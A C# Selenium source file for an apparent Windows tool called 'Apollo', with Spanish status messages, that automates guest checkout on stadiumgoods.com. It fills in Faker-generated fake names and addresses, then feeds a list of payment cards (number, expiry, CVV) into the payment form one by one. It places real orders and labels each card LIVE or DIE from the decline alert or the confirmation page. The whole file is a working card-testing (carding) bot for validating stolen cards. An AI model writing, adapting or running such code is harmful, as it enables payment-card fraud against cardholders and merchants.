using Bogus;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Globalization;
using System.Linq;
using System.Threading;

namespace _0lymp.us.Gods
{

    public partial class Apollo : Component
    {
        private Iris iris;
        private static IWebDriver apollo;

        public List<string> CardsList { get; set; }
        public string Url { get; set; }
        private Faker Faker { get; set; }
        private string FirstName { get; set; }
        private string LastName { get; set; }
        private string UserName { get; set; }
        private string Email { get; set; }
        private string Company { get; set; }
        private string Password { get; set; }
        private string Address { get; set; }
        private string Address2 { get; set; }
        private string City { get; set; }
        private string State { get; set; }
        private string Zip { get; set; }
        private string Phone { get; set; }
        private string CCScheme { get; set; }


        public Thread VerifyCardsThread;
        public Thread StateCardsThread;
        public Thread ReduceCardsThread;
        public Thread RefreshProgressThread;

        public delegate void VerifyCardsCompleteHandler();
        public delegate void StateCardsCompleteHandler(string card);
        public delegate void ReduceCardsCompleteHandler(string cards);
        public delegate void RefreshProgressCompleteHandler(int percent, string message, string typeMessage);

        public event VerifyCardsCompleteHandler VerifyCardsComplete;
        public event StateCardsCompleteHandler LiveCardComplete;
        public event StateCardsCompleteHandler DieCardComplete;
        public event ReduceCardsCompleteHandler ReduceCardsComplete;
        public event RefreshProgressCompleteHandler RefreshProgressComplete;

        public Apollo()
        {
            InitializeComponent();
            Faker = new Faker();
        }

        public Apollo(IContainer container)
        {
            container.Add(this);
            InitializeComponent();
        }

        public void VerifyCards()
        {
            FirstName = Faker.Name.FirstName();
            LastName = Faker.Name.LastName();
            Email = Faker.Internet.Email();
            Password = Faker.Internet.Password();
            UserName = Faker.Internet.UserName();
            Company = ((Math.Round(new Random().NextDouble()) == 0.0) ? "" : Faker.Company.CompanyName());
            Address = Faker.Address.StreetAddress();
            Address2 = ((Math.Round(new Random().NextDouble()) == 0.0) ? "" : Faker.Address.SecondaryAddress());
            City = Faker.Address.City();
            Zip = Faker.Address.ZipCode("#####");
            Phone = Faker.Phone.PhoneNumber("############");
            iris = new Iris();
            Load();
            apollo.Kill();
            this.VerifyCardsComplete();
        }

        private void Load(bool fastRestart = false)
        {
            try
            {
                ExecuteRefreshProgressThread(1, "Cargando APOLO...", "Success");
                if (!fastRestart)
                {
                    apollo = Driver.ChromeNoImage();
                }

                apollo.GoUrl(Url);
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement webElement = apollo.ElementRandomVisible(By.CssSelector("body > div.wrapper > div.page > div.container.col1-layout > div > div.col-main > div.mb-content > div > div.category-products > ul > li > div > div.product-name > a"), "ExceptionLoad");
            if (webElement.IsNotNull())
            {
                DetailProduct(webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(1, "ERROR APOLO #1, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void DetailProduct(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(10, "Detalle de producto.", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = apollo.ElementVisible(By.CssSelector("#product_addtocart_form > section > div.product-essential > div.product-shop > div.product-options-bottom > div.add-to-cart > div.add-to-cart-buttons > button"), "ExceptionDetailProduct");
            if (_webElement.IsNotNull())
            {
                AddToCart(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(10, "ERROR APOLO #2, Reiniciando proceso...", "Success");
                FastRestart();
            }
        }

        private void AddToCart(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(20, "Cargando Producto.", "Success");
                SelectSize();
                
                Thread.Sleep(3000);
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = apollo.ElementTextEquals(By.CssSelector("#header > div.page-header-container > div.header-row-primary > div.header-tools.header-tools--user > div.header-tools__item.header-tools__item--cart.items-in-cart > div > ul > li > a"), "1");

            if (_webElement.IsNotNull())
            {
                Checkout();
            }
            else
            {
                ExecuteRefreshProgressThread(20, "ERROR APOLO #3, Reiniciando proceso...", "Success");
                Restart();
            }
        }


        private void SelectSize()
        {
            try
            {
                ExecuteRefreshProgressThread(30, "Seleccionando dimesiones del producto", "Success");
                IWebElement webElement = apollo.ElementVisible(By.CssSelector("#product-options-wrapper > div.product-sizes > div.product-sizes__selected > span > span.product-sizes__size"));
                //#product-options-wrapper > div.product-sizes > div.product-sizes__selected > span
                //IWebElement webElement = apollo.ElementVisible(By.CssSelector("#product-options-wrapper > div.product-sizes > div.product-sizes__selected > span"));
                if (webElement.IsNotNull())
                {
                    webElement.Click();
                    Thread.Sleep(3000);
                    IWebElement _webElement = apollo.ElementRandomTextContains(By.CssSelector("#product-options-wrapper > div.product-sizes.product-sizes-open > div.product-sizes__options > label > span > span.product-sizes__price > span"), ".");
                    if (_webElement.IsNotNull())
                    {
                        _webElement.Click();
                    }
                    else
                    {
                        ExecuteRefreshProgressThread(1, "ERROR APOLO #4, Reiniciando proceso...", "Success");
                        FastRestart();
                    }
                }
                else
                {
                    System.Windows.Forms.MessageBox.Show("Fuck");
                }
            }
            catch (NoSuchElementException) { throw; }
            catch (StaleElementReferenceException) { throw; }
            catch (WebDriverException) { throw; }
            catch (NullReferenceException) { throw; }
        }

        private void Checkout()
        {
            try
            {
                ExecuteRefreshProgressThread(50, "Chequeo", "Success");
                apollo.GoUrl("https://www.stadiumgoods.com/checkout/onepage/");
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = apollo.ElementVisible(By.CssSelector("#checkout-step-login > div > div.guest-checkout > button"));

            if (_webElement.IsNotNull())
            {
                CheckoutMethod(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(50, "ERROR APOLO #5, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void CheckoutMethod(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(60, "Metodo de Chequeo", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = apollo.ElementVisible(By.Id("shipping:email"));

            if (_webElement.IsNotNull())
            {
                ShippingInformation();
            }
            else
            {
                ExecuteRefreshProgressThread(60, "ERROR APOLO #6, Reiniciando proceso...", "Success");
            }
        }

        private void ShippingInformation(bool OtherAddress = false)
        {
            try
            {
                ExecuteRefreshProgressThread(70, "Direccion Fake", "Success");
                if (!OtherAddress)
                {
                    apollo.FindElement(By.Id("shipping:email")).SendKeys(Email);
                    Thread.Sleep(500);
                    apollo.FindElement(By.Id("shipping:telephone")).SendKeys(Phone);
                    Thread.Sleep(500);
                    apollo.FindElement(By.Id("shipping:firstname")).SendKeys(FirstName);
                    Thread.Sleep(500);
                    apollo.FindElement(By.Id("shipping:lastname")).SendKeys(LastName);
                }
                Thread.Sleep(500);
                apollo.FindElement(By.Id("shipping:street1")).Clear();
                apollo.FindElement(By.Id("shipping:street1")).SendKeys(Faker.Random.Number(9).ToString());



                Thread.Sleep(1000);
                IWebElement _webElement = apollo.ElementRandomVisible(By.CssSelector("body > div.pca > div:nth-child(4) > div.pca.pcalist > div.pcaitem"));
                if (_webElement.IsNotNull())
                {
                    _webElement.Click();
                    Thread.Sleep(1000);
                    IWebElement __webElement = apollo.ElementRandomVisible(By.CssSelector("body > div.pca > div:nth-child(4) > div.pca.pcalist > div.pcaitem"));
                    if (__webElement.IsNotNull())
                    {
                        __webElement.Click();
                    }
                }

                Thread.Sleep(5000);
                apollo.FindElement(By.Id("checkout-button-disabled")).Click();

            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement ___webElement = apollo.ElementVisible(By.Id("sg-address-verification-button"));

            if (___webElement.IsNotNull())
            {
                AddressVerfication(___webElement);
            }

            if (apollo.ElementTextContains(By.CssSelector("#address-message > p"), "address").IsNotNull() || apollo.ElementTextContains(By.CssSelector("#checkout-shipping-method-load > span"), "address").IsNotNull())
            {
                ShippingInformation(true);
            }


            if (apollo.ElementVisible(By.Id("vantiv_cc_cc_number")).IsNotNull())
            {
                LastProccess();
            }
            else
            {
                ExecuteRefreshProgressThread(70, "ERROR APOLO #7, Reiniciando proceso...", "Success");
                Restart();
            }
        }


        private void AddressVerfication(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(80, "Verificando direccion Fake", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }
            Thread.Sleep(5000);
            apollo.FindElement(By.Id("checkout-button-disabled")).Click();

        }


        private void LastProccess()
        {
            try
            {
                int limitDie = 1;
                int num = 0;
                while (num < CardsList.Count())
                {
                    List<string> list = CardsList[num].Split('|').ToList();
                    if (CardsList.Count() > 1)
                    {
                        CardsList[num] = CardsList[num].Replace("\r", "");
                    }
                    string text = CardsList[num];
                    string cards = CardsList[num].ToString();
                    if (CardsList.Count() > 1)
                    {
                        string text3 = CardsList[num] = (CardsList[num] += "\r");
                        cards = string.Join("", CardsList.ToArray());
                        text += "\r";
                    }
                    Payment(list[0], list[1], list[2], list[3]);

                    if (Confirmation())
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteLiveCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        if (CardsList.Count() > 0)
                        {
                            Restart();
                        }
                    }
                    else
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteDieCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        if (limitDie < 20)
                        {
                            limitDie++;
                        }
                        else
                        {
                            Restart();
                        }
                    }
                }
            }
            catch (ArgumentOutOfRangeException) {/*throw;*/ }
        }

        private void Payment(string number, string month, string year, string cvv)
        {
            try
            {
                ExecuteRefreshProgressThread(90, "Añadiendo tarjeta: " + number, "Success");

                apollo.FindElement(By.Id("vantiv_cc_cc_number")).Clear();
                //apollo.FindElement(By.Id("vantiv_cc_cc_number")).SendKeys(number);
                for (int i = 0; i < number.Length; i++)
                {
                    apollo.FindElement(By.Id("vantiv_cc_cc_number")).SendKeys(number.Substring(i, 1));
                    Thread.Sleep(300);
                }
                Thread.Sleep(500);

                string date = month + year.Substring(year.Length - 2);

                apollo.FindElement(By.Id("credit_card_expirations_vantiv")).Clear();
                //apollo.FindElement(By.Id("credit_card_expirations_vantiv")).SendKeys(date);
                for (int i = 0; i < date.Length; i++)
                {
                    apollo.FindElement(By.Id("credit_card_expirations_vantiv")).SendKeys(date.Substring(i, 1));
                    Thread.Sleep(300);
                }
                Thread.Sleep(500);

                cvv = cvv.Replace("\r", "");
                switch (cvv.Count())
                {
                    case 3:
                        cvv = "000";
                        break;
                    case 4:
                        cvv = "0000";
                        break;
                }

                apollo.FindElement(By.Id("vantiv_cc_cc_cid")).Clear();
                //apollo.FindElement(By.Id("vantiv_cc_cc_cid")).SendKeys(cvv);
                for (int i = 0; i < cvv.Length; i++)
                {
                    apollo.FindElement(By.Id("vantiv_cc_cc_cid")).SendKeys(cvv.Substring(i, 1));
                    Thread.Sleep(300);
                }
                Thread.Sleep(500);
                apollo.FindElement(By.Id("place-order")).Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }
        }

        private bool Confirmation()
        {
            if (apollo.AlertPresent() != null)
            {
                if (apollo.AlertPresent().Text.Contains("declined"))
                {
                    ExecuteRefreshProgressThread(100, "DIE", "Success");
                    apollo.AlertPresent().Accept();
                    apollo.SwitchTo().DefaultContent();
                    return false;
                }
            }

            if (apollo.ElementTextEquals(By.CssSelector("body > div.wrapper > div.page > div.container.col1-layout > div > div > div.page-title > h1"), "Thank You!", "LiveReal").IsNotNull())
            {
                ExecuteRefreshProgressThread(100, "LIVE", "Success");
                return true;
            }
            ExecuteRefreshProgressThread(100, "ERROR APOLO #8, Reiniciando proceso...", "Success");
            Restart();
            return false;
        }

        private void Restart()
        {
            apollo.Kill();
            VerifyCards();
        }

        private void FastRestart()
        {
            Load(true);
        }

        public void ExecuteThread()
        {
            VerifyCardsThread = new Thread(VerifyCards);
            VerifyCardsThread.Start();
        }

        private void ExecuteRefreshProgressThread(int percent, string message, string typeMessage)
        {
            RefreshProgressThread = new Thread((ThreadStart)delegate
            {
                RefreshProgress(percent, message, typeMessage);
            });
            RefreshProgressThread.Start();
        }

        public void KillThread()
        {
            try
            {
                ExecuteRefreshProgressThread(0, "", "Success");
                VerifyCardsThread.Abort();
                VerifyCardsThread.Join();
                apollo.Kill();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteLiveCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                LiveCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillLiveCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteDieCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                DieCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillDieCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteReduceCardsThread(string cards)
        {
            ReduceCardsThread = new Thread((ThreadStart)delegate
            {
                ReduceCards(cards);
            });
            ReduceCardsThread.Start();
        }

        public void KillReduceCardsThread()
        {
            try
            {
                ReduceCardsThread.Abort();
                ReduceCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }
        private void RefreshProgress(int percent, string message, string typeMessage)
        {
            try
            {
                this.RefreshProgressComplete(percent, message, typeMessage);
            }
            catch (NullReferenceException) {/* throw;*/ }
        }

        public void ReduceCards(string cards)
        {
            this.ReduceCardsComplete(cards);
        }

        private void LiveCard(string card)
        {
            this.LiveCardComplete(card);
        }

        private void DieCard(string card)
        {
            this.DieCardComplete(card);
        }
    }
}
